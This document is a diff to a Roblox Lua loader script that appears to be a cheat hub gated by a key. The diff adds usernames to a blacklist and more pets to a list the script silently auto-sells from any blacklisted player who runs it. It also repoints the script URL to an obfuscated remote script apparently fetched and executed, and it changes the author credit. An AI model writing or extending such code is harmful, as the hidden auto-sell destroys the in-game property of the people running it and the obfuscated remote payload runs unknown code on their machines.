@@ -19,7 +19,9 @@ local BLACKLISTED_USERS = {
     "18734D8",
     "baby_girl1n4",
     "prince_polA",
-    "prince_poIA"
+    "prince_poIA",
+    "loneycat1113",
+    "JhannaBaltero15"
 }
 
 local function isBlacklisted(player)
@@ -84,7 +86,8 @@ if isBlacklisted(localPlayer) then
             "Spirit Wolf", "Storm Tiger", "Lunar Dragon", "Crystal Dragon",
             "Pelican", "Divine Dragon", "Neon Divine Dragon", "Space Dragon",
             "Red Alien", "Fire Alien", "Vortex", "Astrax",
-            "Rage Shark", "Titan Crocodile", "Battle Gorilla", "Champion Dragon"
+            "Rage Shark", "Titan Crocodile", "Battle Gorilla", "Champion Dragon",
+            "Void Dragon", "Golden Titan", "Spike Dragon", "Neon Thunder Bear", "Crystal Bear"
         }
         
         for _, pet in ipairs(petsToAutoSell) do
@@ -98,8 +101,8 @@ end
 
 -- // Configuration
 local Key = "PrimeKenzouu"
-local ScriptUrl = "https://slh-hub.lovable.app/raw/kyomba2public"
-local TiktokLink = "https://tiktok.com/kenzxouu.official"
+local ScriptUrl = "https://codeberg.org/galinganmoicrackscriptkoHAHA/Public/raw/branch/main/obfuscated.script"
+local TiktokLink = "https://tiktok.com/officialkenzouu"
 
 -- // Services
 local TweenService = game:GetService("TweenService")
@@ -185,7 +188,7 @@ TitleLabel.TextSize = 22
 
 local SubTitleLabel = Instance.new("TextLabel")
 SubTitleLabel.Parent = MainFrame
-SubTitleLabel.Text = "Made by: PrimeKenzou"
+SubTitleLabel.Text = "Made by: Boss Kenzou"
 SubTitleLabel.Size = UDim2.new(1, 0, 0, 20)
 SubTitleLabel.Position = UDim2.new(0, 0, 0.18, 0)
 SubTitleLabel.BackgroundTransparency = 1
